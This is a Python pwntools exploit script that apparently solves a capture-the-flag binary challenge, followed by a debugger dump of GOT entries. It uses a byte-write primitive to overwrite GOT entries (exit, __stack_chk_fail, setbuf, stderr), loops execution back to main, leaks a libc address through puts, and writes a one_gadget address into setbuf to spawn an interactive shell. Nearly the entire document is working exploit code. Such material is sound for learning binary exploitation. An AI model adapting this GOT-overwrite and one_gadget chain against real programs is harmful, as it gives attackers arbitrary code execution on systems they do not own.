#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''
libc = elf.libc

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]



def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1337)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])


r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================

def get_value(current, target):
 
    # Ensure both arguments are 8-bit values
    current &= 0xFF
    target &= 0xFF

    # Search for the correct input byte 'val'
    for val in range(256):  # Loop through all 8-bit values (0x00 to 0xFF)
        result = current ^ (val ^ (val >> 1))
        if result == target:
            return val  # Found the correct input byte

    # If no valid input byte is found, raise an exception
    raise ValueError(f"cuec no value found for {hex(target)}")

def write_byte(address, value):
    sla(b"address:", str(address).encode('ascii'))
    sla(b"value:", str(value).encode('ascii'))

#exit address for infinite loops
sla(b"address:", str(elf.got.exit).encode('ascii'))
value = 0xc0 #set to the value of _start (*ptr & 0xff) ^ ((val & 0xff) ^ ((val & 0xff) >> 1))
sla(b"value:", str(value).encode('ascii'))

#stack chk fail to main (no __start)
#0x401030 address at elf.got.__stack_chk_fail
write_byte(elf.got.__stack_chk_fail, get_value((0x401030 & 0xff), elf.sym.main & 0xff))
write_byte(elf.got.__stack_chk_fail+1, get_value(((0x401030 >>8) & 0xff), ((elf.sym.main >> 8) & 0xff)))

#loop to main "clean"
write_byte(elf.got.exit,  get_value(elf.sym._start & 0xff, elf.plt.__stack_chk_fail))

#writing puts (printf does not work cause rdi = 0) in the setbuf on constructor. (since we are looping on main not _start)

#1/16 bruteforce
write_byte(elf.got.setbuf, get_value(( libc.sym.setbuf & 0xff), libc.sym.puts & 0xff))
write_byte(elf.got.setbuf+1, get_value(((libc.sym.setbuf >>8) & 0xff), ((libc.sym.puts >> 8) & 0xff)))

#steerr 0x404080 
write_byte(elf.got.stderr, get_value(( libc.sym.stderr & 0xff), libc.sym.stderr+8 & 0xff))
write_byte(elf.got.stderr+1, get_value(((libc.sym.stderr >>8) & 0xff), ((libc.sym.stderr+8  >> 8) & 0xff)))

#trigger error and leak back to _start
write_byte(elf.got.exit, get_value(elf.sym._start & 0xff, elf.plt.__stack_chk_fail & 0xff))

r.recvline()
r.recvline()

leak = u64(r.recvline().strip().ljust(8, b"\x00"))
logleak("leak,", leak)
libc.address = leak - 0x21b723
logbase()

#back to main
write_byte(elf.got.exit,  get_value(elf.sym._start & 0xff, elf.plt.__stack_chk_fail))

#one gadget into setbuf
onegadget = libc.address + 0xebc88

#writing whole address into setbuf that holds puts

write_byte(elf.got.setbuf, get_value(( libc.sym.puts & 0xff), onegadget & 0xff))
write_byte(elf.got.setbuf+1, get_value(((libc.sym.puts >> 8) & 0xff), ((onegadget >> 8) & 0xff)))
write_byte(elf.got.setbuf+2, get_value(((libc.sym.puts >> 16) & 0xff), ((onegadget >> 16) & 0xff)))
write_byte(elf.got.setbuf+3, get_value(((libc.sym.puts >> 24) & 0xff), ((onegadget >> 24) & 0xff)))
write_byte(elf.got.setbuf+4, get_value(((libc.sym.puts >> 32) & 0xff), ((onegadget >> 32) & 0xff)))
write_byte(elf.got.setbuf+5, get_value(((libc.sym.puts >> 40) & 0xff), ((onegadget >> 40) & 0xff)))
write_byte(elf.got.setbuf+6, get_value(((libc.sym.puts >> 48) & 0xff), ((onegadget >> 48) & 0xff)))

#back to _start
write_byte(elf.got.exit, get_value(elf.plt.__stack_chk_fail & 0xff, elf.sym._start))

#========= interactive ====================
r.interactive()


'''

[0x404018] __stack_chk_fail@GLIBC_2.4 -> 0x401030 ◂— endbr64
[0x404020] setbuf@GLIBC_2.2.5 -> 0x7ffff7c87f29 (rewind+9) ◂— sub rsp, 8
[0x404028] printf@GLIBC_2.2.5 -> 0x7ffff7c606f0 (printf) ◂— endbr64
[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7c62090 (__isoc99_scanf) ◂— endbr64
[0x404038] exit@GLIBC_2.2.5 -> 0x4010d0 (_start) ◂— endbr64

'''
